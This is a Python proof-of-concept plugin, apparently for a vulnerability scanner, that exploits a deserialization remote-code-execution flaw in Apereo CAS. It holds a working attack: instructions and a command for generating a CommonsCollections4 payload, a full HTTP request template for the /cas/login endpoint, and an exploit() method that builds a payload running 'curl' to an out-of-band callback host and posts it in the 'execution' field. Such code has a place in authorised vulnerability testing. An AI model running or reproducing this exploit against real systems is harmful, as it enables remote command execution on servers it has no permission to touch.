import subprocess
import urllib.parse

import WebLog
from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin
import platform


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.critical
        self.detail = """用这个生成payload：<https://github.com/vulhub/Apereo-CAS-Attack>

```shell
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

```http
POST /cas/login HTTP/1.1
Host: your-ip
Content-Length: 2287
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://your-ip:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://your-ip:8080/cas/login
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: JSESSIONID=24FB4BAAE1A66E8B76D521EE366B3E12; _ga=GA1.1.1139210877.1586367734
Connection: close

username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=[payload]&_eventId=submit&submit=LOGIN
```"""
        self.name = "Apereo CAS RCE"

    def check(self):
        client = Http()
        client.url = urljoin(self.target, "/cas/login")
        resp = client.get()
        if "Apereo Central Authentication Service" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        system = platform.system()
        payload = ''
        if "Windows" == system:
            process = subprocess.run(['dependency/win_jre8/bin/java.exe', '-jar',
                                      'dependency/apereo-cas-attack-1.0-SNAPSHOT-all.jar', "CommonsCollections4",
                                      "curl {}".format(WebLog.rev_url)], capture_output=True)
            payload = process.stdout.decode().replace("\r", "").replace("\n", "")
        if "Linux" == system:
            process = subprocess.run(['dependency/linux_jre8/bin/java', '-jar',
                                      'dependency/apereo-cas-attack-1.0-SNAPSHOT-all.jar', "CommonsCollections4",
                                      "curl {}".format(WebLog.rev_url)], capture_output=True)
            payload = process.stdout.decode().replace("\r", "").replace("\n", "")
        c = WebLog.create('headers["User-Agent"].contains("curl")')
        client = Http()
        client.url = urljoin(self.target, "/cas/login")
        client.data['username'] = '123456'
        client.data['password'] = '123456'
        client.data['lt'] = 'LT-3-Slrjd9goH4Nj0smzxGe20f1Ce0n37U-cas01.example.org'
        client.data['execution'] = urllib.parse.unquote(payload)
        client.data['_eventId'] = 'submit'
        client.data['submit'] = 'LOGIN'
        client.post()
        if WebLog.get(c).requested:
            return True
        else:
            return False
